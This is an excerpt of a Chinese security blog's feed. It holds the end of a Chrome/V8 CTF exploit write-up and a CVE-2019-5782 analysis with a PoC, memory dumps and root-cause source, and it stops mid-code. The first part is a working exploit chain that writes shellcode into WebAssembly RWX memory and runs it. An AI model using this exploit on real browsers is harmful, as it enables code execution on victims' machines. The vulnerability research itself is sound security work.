0xFFFF;</span><br><span class="line">        var b16 &#x3D; val.lo_ &gt;&gt;&gt; 16;</span><br><span class="line">        var b00 &#x3D; val.lo_ &amp; 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        var c48 &#x3D; 0, c32 &#x3D; 0, c16 &#x3D; 0, c00 &#x3D; 0;</span><br><span class="line">        c00 +&#x3D; a00 + b00;</span><br><span class="line">        c16 +&#x3D; c00 &gt;&gt;&gt; 16;</span><br><span class="line">        c00 &amp;&#x3D; 0xFFFF;</span><br><span class="line">        c16 +&#x3D; a16 + b16;</span><br><span class="line">        c32 +&#x3D; c16 &gt;&gt;&gt; 16;</span><br><span class="line">        c16 &amp;&#x3D; 0xFFFF;</span><br><span class="line">        c32 +&#x3D; a32 + b32;</span><br><span class="line">        c48 +&#x3D; c32 &gt;&gt;&gt; 16;</span><br><span class="line">        c32 &amp;&#x3D; 0xFFFF;</span><br><span class="line">        c48 +&#x3D; a48 + b48;</span><br><span class="line">        c48 &amp;&#x3D; 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        return new _u64((c48 &lt;&lt; 16) | c32, (c16 &lt;&lt; 16) | c00);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     addi(h,l) &#123;</span><br><span class="line">        return this.add(new _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     subi(h,l) &#123;</span><br><span class="line">        return this.sub(new _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     not() &#123;</span><br><span class="line">        return new _u64(~this.hi_, ~this.lo_)</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     neg() &#123;</span><br><span class="line">        return this.not().add(new _u64(0,1));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     sub(val) &#123;</span><br><span class="line">        return this.add(val.neg());</span><br><span class="line">     &#125;;</span><br><span class="line">  </span><br><span class="line">     swap32(val) &#123;</span><br><span class="line">        return ((val &amp; 0xFF) &lt;&lt; 24) | ((val &amp; 0xFF00) &lt;&lt; 8) |</span><br><span class="line">              ((val &gt;&gt; 8) &amp; 0xFF00) | ((val &gt;&gt; 24) &amp; 0xFF);</span><br><span class="line">     &#125;</span><br><span class="line">  </span><br><span class="line">     bswap() &#123;</span><br><span class="line">        var lo &#x3D; swap32(this.lo_);</span><br><span class="line">        var hi &#x3D; swap32(this.hi_);</span><br><span class="line">        return new _u64(lo, hi);</span><br><span class="line">     &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">var u64 &#x3D; function(hi, lo) &#123; return new _u64(hi,lo) &#125;;</span><br><span class="line"></span><br><span class="line">function gc()&#123;</span><br><span class="line">    for (var i &#x3D; 0; i &lt; 1024 * 1024 * 16; i++)&#123;</span><br><span class="line">        new String();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasm_code &#x3D; new Uint8Array([</span><br><span class="line">    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">    0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,</span><br><span class="line">    0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,</span><br><span class="line">    0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,</span><br><span class="line">    0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x00, 0x41, 0x00, 0x0b</span><br><span class="line">  ]);</span><br><span class="line">  const wasm_instance &#x3D; new WebAssembly.Instance(</span><br><span class="line">    new WebAssembly.Module(wasm_code));</span><br><span class="line">  const wasm_func &#x3D; wasm_instance.exports.a;</span><br><span class="line"></span><br><span class="line">var shellcode&#x3D;[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">var fake_arraybuffer &#x3D; [</span><br><span class="line">    &#x2F;&#x2F;map|properties</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    &#x2F;&#x2F;elements|length</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x1000).asDouble(),</span><br><span class="line">    &#x2F;&#x2F;backingstore|0x2</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x2).asDouble(),</span><br><span class="line">    &#x2F;&#x2F;padding</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    &#x2F;&#x2F;fake map</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x1900042319080808).asDouble(),</span><br><span class="line">    new Int64(0x00000000082003ff).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">].splice(0);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; %DebugPrint(fake_arraybuffer);</span><br><span class="line"></span><br><span class="line">var ab &#x3D; new ArrayBuffer(0x1000);</span><br><span class="line">var a &#x3D; [1.1, 1.1, 1.1, 1.1,1.1];</span><br><span class="line">var b &#x3D; [fake_arraybuffer, wasm_instance, ab, 2.2, 2.2];</span><br><span class="line">var c &#x3D; [3.3, 3.3, 3.3, 3.3, 3.3];</span><br><span class="line">&#x2F;&#x2F;布局内存，让array连续存放</span><br><span class="line">a &#x3D; a.splice(0);</span><br><span class="line">b &#x3D; b.splice(0);</span><br><span class="line">c &#x3D; c.splice(0);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; leak出double&#x2F;object array的map</span><br><span class="line">&#x2F;&#x2F; print(&quot;0x&quot; + Int64.fromDouble(a.oob()).toString(16));</span><br><span class="line">&#x2F;&#x2F; print(new Int64(Int64.fromDouble(a.oob())).asDouble());</span><br><span class="line">double_map &#x3D; a.oob();</span><br><span class="line">console.log(&quot;doube map is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(double_map).toString(16));</span><br><span class="line">console.log(&quot;object map is:&quot;);</span><br><span class="line">object_map &#x3D; b.oob();</span><br><span class="line">console.log(Int64.fromDouble(object_map).toString(16));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;覆盖object array的map为double,于是可以通过b来leak</span><br><span class="line">b.oob(double_map);</span><br><span class="line"></span><br><span class="line">fake_arraybuffer_obj &#x3D; b[0];</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_obj).toString(16));</span><br><span class="line">&#x2F;&#x2F; %DebugPrint(fake_arraybuffer);</span><br><span class="line">fake_arraybuffer_elem &#x3D; fake_arraybuffer_obj + new Int64(0xc70).asDouble();&#x2F;&#x2F;这个偏移需要适配</span><br><span class="line">console.log(&quot;fake_arraybuffer addr is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_elem).toString(16));</span><br><span class="line">console.log(&quot;fake_arraybuffer map is:&quot;);</span><br><span class="line">fake_arraybuffer_map &#x3D; fake_arraybuffer_elem + new Int64(0x40).asDouble();</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_map).toString(16));</span><br><span class="line">fake_arraybuffer[0] &#x3D; fake_arraybuffer_map;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; %DebugPrint(wasm_instance);</span><br><span class="line">console.log(&quot;wasm_instance is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(b[1]).toString(16));</span><br><span class="line">locate_rwx_addr &#x3D; b[1] + new Int64(0x88 - 0x1).asDouble();</span><br><span class="line">fake_arraybuffer[4] &#x3D; locate_rwx_addr;</span><br><span class="line"></span><br><span class="line">var d &#x3D; [fake_arraybuffer_elem, 1.1, 1.1];</span><br><span class="line">d.oob(object_map);</span><br><span class="line">var dv &#x3D; new DataView(d[0]);</span><br><span class="line">console.log(&quot;fake_arraybuffer done&quot;);</span><br><span class="line">&#x2F;&#x2F; %DebugPrint(dv);</span><br><span class="line">rwx_addr &#x3D; dv.getFloat64(0, true);</span><br><span class="line">console.log(&quot;rwx addr is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(rwx_addr).toString(16));</span><br><span class="line">fake_arraybuffer[4] &#x3D; rwx_addr;</span><br><span class="line">for (i &#x3D; 0; i &lt; shellcode.length; i++)&#123;</span><br><span class="line">    dv.setUint32(i * 4, shellcode[i], true);</span><br><span class="line">&#125;</span><br><span class="line">wasm_func();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>测试机器ubuntu16.04<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-04-29-042454.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;star-ctf-chrome-oob-writeup&quot;&gt;&lt;a href=&quot;#star-ctf-chrome-oob-writeup&quot; class=&quot;headerlink&quot; title=&quot;star ctf chrome oob writeup&quot;&gt;&lt;/a&gt;star 
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2019-5782:Inappropriate implementation in V8 漏洞利用</title>
    <link href="http://eternalsakura13.com/2018/11/28/bug-906043/"/>
    <id>http://eternalsakura13.com/2018/11/28/bug-906043/</id>
    <published>2018-11-28T02:35:20.063Z</published>
    <updated>2019-07-24T13:55:46.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=906043" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=906043</a></li><li><a href="https://chromium.googlesource.com/v8/v8/+/4e3a17d0408627517d4a81b3bf5daf85e416e9ac/test/mjsunit/regress/regress-crbug-906043.js" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/4e3a17d0408627517d4a81b3bf5daf85e416e9ac/test/mjsunit/regress/regress-crbug-906043.js</a></li></ul><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Flags: --allow-natives-syntax</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="built_in">arguments</span>.length;</span><br><span class="line">  a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a2[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">21</span>] = <span class="number">1.39064994160909e-309</span>;  <span class="comment">// 0xffff00000000</span></span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">41</span>] = <span class="number">8.91238232205e-313</span>;  <span class="comment">// 0x2a00000000</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a1, a2;</span><br><span class="line"><span class="keyword">var</span> a3 = [<span class="number">1.1</span>,<span class="number">2.2</span>];</span><br><span class="line">a3.length = <span class="number">0x11000</span>;</span><br><span class="line">a3.fill(<span class="number">3.3</span>);</span><br><span class="line"><span class="keyword">var</span> a4 = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) fun(...a4);</span><br><span class="line"><span class="comment">// %OptimizeFunctionOnNextCall(fun);</span></span><br><span class="line">fun(...a3);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; a2.length; i++)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a2[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a2.length);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">a1:</span><br><span class="line">DebugPrint: <span class="number">0x358226e9b891</span>: [JSArray]</span><br><span class="line"> - length: <span class="number">16</span></span><br><span class="line"> - elements: <span class="number">0x358226e9b801</span> &lt;FixedDoubleArray[<span class="number">16</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line">        <span class="number">1</span><span class="number">-15</span>: <span class="xml"><span class="tag">&lt;<span class="name">the_hole</span>&gt;</span></span></span><br><span class="line"><span class="xml"> &#125;</span></span><br><span class="line"><span class="xml">a2:</span></span><br><span class="line"><span class="xml">DebugPrint: 0x358226e9b941: [JSArray]</span></span><br><span class="line"><span class="xml"> - length: 42</span></span><br><span class="line"> - elements: 0x358226e9b8b1 &lt;FixedDoubleArray[65535]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">        1-15: &lt;the_hole&gt;</span><br><span class="line">          16: 2.90681e-310</span><br><span class="line">          17: 2.90688e-310</span><br><span class="line">          18: 2.90674e-310</span><br><span class="line">          19: 8.91238e-313</span><br><span class="line">    20-51430: -1.18859e+148</span><br><span class="line"></span><br><span class="line">a1 elements:</span><br><span class="line">lldb) x/50gx 0x358226e9b801-1</span><br><span class="line">0x358226e9b800: 0x00003582ced81461 0x0000001000000000</span><br><span class="line">0x358226e9b810: 0x3ff199999999999a-&gt;a1[0] 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b820: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b830: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b840: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b850: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b860: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b870: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b880: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">a1 object:</span><br><span class="line">0x358226e9b890: 0x0000358279782f29 0x00003582ced80c29</span><br><span class="line">0x358226e9b8a0: 0x0000358226e9b801 0x0000001000000000</span><br><span class="line">a2 elements:</span><br><span class="line">0x358226e9b8b0: 0x00003582ced81461 0x0000ffff00000000-&gt;a1[21]</span><br><span class="line">0x358226e9b8c0: 0x3ff199999999999a 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b8d0: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b8e0: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b8f0: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b900: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b910: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b920: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b930: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">a2 object:</span><br><span class="line">0x358226e9b940: 0x0000358279782f29 0x00003582ced80c29</span><br><span class="line">0x358226e9b950: 0x0000358226e9b8b1 0x0000002a00000000-&gt;a1[41]</span><br><span class="line">0x358226e9b960: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">0x358226e9b970: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">0x358226e9b980: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line"></span><br><span class="line">function fun(arg) &#123;</span><br><span class="line">    let x = arguments.length;// x = 65536，但范围分析认为是65534</span><br><span class="line">    a1 = new Array(0x10);</span><br><span class="line">    a1[0] = 1.1;</span><br><span class="line">    a2 = new Array(0x10);</span><br><span class="line">    a2[0] = 1.1;</span><br><span class="line">    x = x &gt;&gt; 16;// x = 65536&gt;&gt;16 = 1,但范围分析认为是65534&gt;&gt;16 = 0</span><br><span class="line">    a1[x * 21] = 1.39064994160909e-309;  // 0xffff00000000</span><br><span class="line">    a1[x * 41] = 8.91238232205e-313;  // 0x2a00000000  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞验证，边界检查被移除后的越界读写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1.1</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">3.5906059781413e-311</span><br><span class="line">3.592134784647e-311</span><br><span class="line">3.5918890420468e-311</span><br><span class="line">8.91238232205e-313</span><br><span class="line">3.5921347865955e-311</span><br><span class="line">8.487983164e-314</span><br><span class="line">4.243991582e-314</span><br><span class="line">0</span><br><span class="line">3.5906059883793e-311</span><br><span class="line">3.592134783722e-311</span><br><span class="line">3.592134783722e-311</span><br><span class="line">3.5921347865955e-311</span><br><span class="line">1.4853970537e-313</span><br><span class="line">1.0609978955e-313</span><br><span class="line">0</span><br><span class="line">3.590605972767e-311</span><br><span class="line">3.5906059725297e-311</span><br><span class="line">3.5906059886165e-311</span><br><span class="line">3.590605982569e-311</span><br><span class="line">3.592134783722e-311</span><br><span class="line">3.592134783722e-311</span><br><span class="line">3.592134783793e-311</span><br><span class="line">1.1</span><br><span class="line">3.592134783793e-311</span><br><span class="line">3.5906059781413e-311</span><br><span class="line">3.592134783793e-311</span><br><span class="line">42</span><br></pre></td></tr></table></figure><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>在typer phase里对SpeculativeNumberShiftRight的range进行计算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#72:SpeculativeNumberShiftRight[SignedSmall](#102:LoadField, #27:NumberConstant, #70:Checkpoint, #55:JSCreateArray)</span><br><span class="line">    102: LoadField[tagged base, 24, #length, NonInternal, kRepTagged|kTypeAny, FullWriteBarrier](9, 101, 18)</span><br><span class="line">    27: NumberConstant[16]</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-12-03-034318.png" alt=""><br>由于在typer phase还不会对Load处理，于是在第一次对NumberShiftRight进行range analysis的时候，会将其范围直接当做int32的最大和最小值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#   define INT32_MIN       ((int32_t)(-2147483647-1))</span><br><span class="line">#   define INT32_MAX       ((int32_t)(2147483647))</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Type <span class="title">OperationTyper::NumberShiftRight</span><span class="params">(Type lhs, Type rhs)</span> </span>&#123;</span><br><span class="line">  DCHECK(lhs.Is(Type::Number()));</span><br><span class="line">  DCHECK(rhs.Is(Type::Number()));</span><br><span class="line"></span><br><span class="line">  lhs = NumberToInt32(lhs);</span><br><span class="line">  rhs = NumberToUint32(rhs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lhs.IsNone() || rhs.IsNone()) <span class="keyword">return</span> Type::None();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int32_t</span> min_lhs = lhs.Min();</span><br><span class="line">  <span class="keyword">int32_t</span> max_lhs = lhs.Max();</span><br><span class="line">  <span class="keyword">uint32_t</span> min_rhs = rhs.Min();</span><br><span class="line">  <span class="keyword">uint32_t</span> max_rhs = rhs.Max();</span><br><span class="line">  <span class="keyword">if</span> (max_rhs &gt; <span class="number">31</span>) &#123;</span><br><span class="line">    <span class="comment">// rhs can be larger than the bitmask</span></span><br><span class="line">    max_rhs = <span class="number">31</span>;</span><br><span class="line">    min_rhs = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">double</span> <span class="built_in">min</span> = <span class="built_in">std</span>::<span class="built_in">min</span>(min_lhs &gt;&gt; min_rhs, min_lhs &gt;&gt; max_rhs);</span><br><span class="line">  <span class="keyword">double</span> <span class="built_in">max</span> = <span class="built_in">std</span>::<span class="built_in">max</span>(max_lhs &gt;&gt; min_rhs, max_lhs &gt;&gt; max_rhs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"min lhs is %d\n"</span>, min_lhs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"min rhs is %d\n"</span>, min_rhs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"max lhs is %d\n"</span>, max_lhs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"max rhs is %d\n"</span>, max_rhs);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">max</span> == kMaxInt &amp;&amp; <span class="built_in">min</span> == kMinInt) <span class="keyword">return</span> Type::Signed32();</span><br><span class="line">  <span class="keyword">return</span> Type::Range(<span class="built_in">min</span>, <span class="built_in">max</span>, zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是在第一次对NumberShiftRight进行range analysis之后得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">min lhs is -2147483648</span><br><span class="line">min rhs is 16</span><br><span class="line">max lhs is 2147483647</span><br><span class="line">max rhs is 16</span><br><span class="line">...</span><br><span class="line">[Type: Range(-32768, 32767)]</span><br></pre></td></tr></table></figure><p>然后在typer lowering phase里将JSCreateArray reduce成ArgumentsLength,并计算其范围。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">JSCreateLowering::ReduceJSCreateArguments</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  DCHECK_EQ(IrOpcode::kJSCreateArguments, node-&gt;opcode());</span><br><span class="line">  CreateArgumentsType type = CreateArgumentsTypeOf(node-&gt;op());</span><br><span class="line">  Node* <span class="keyword">const</span> frame_state = NodeProperties::GetFrameStateInput(node);</span><br><span class="line">  Node* <span class="keyword">const</span> outer_state = frame_state-&gt;InputAt(kFrameStateOuterStateInput);</span><br><span class="line">  Node* <span class="keyword">const</span> control = graph()-&gt;start();</span><br><span class="line">  FrameStateInfo state_info = FrameStateInfoOf(frame_state-&gt;op());</span><br><span class="line">  <span class="function">SharedFunctionInfoRef <span class="title">shared</span><span class="params">(broker(),</span></span></span><br><span class="line"><span class="function"><span class="params">                               state_info.shared_info().ToHandleChecked())</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use the ArgumentsAccessStub for materializing both mapped and unmapped</span></span><br><span class="line">  <span class="comment">// arguments object, but only for non-inlined (i.e. outermost) frames.</span></span><br><span class="line">  <span class="keyword">if</span> (outer_state-&gt;opcode() != IrOpcode::kFrameState) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">      <span class="keyword">case</span> CreateArgumentsType::kMappedArguments: &#123;</span><br><span class="line">        <span class="comment">// TODO(mstarzinger): Duplicate parameters are not handled yet.</span></span><br><span class="line">        <span 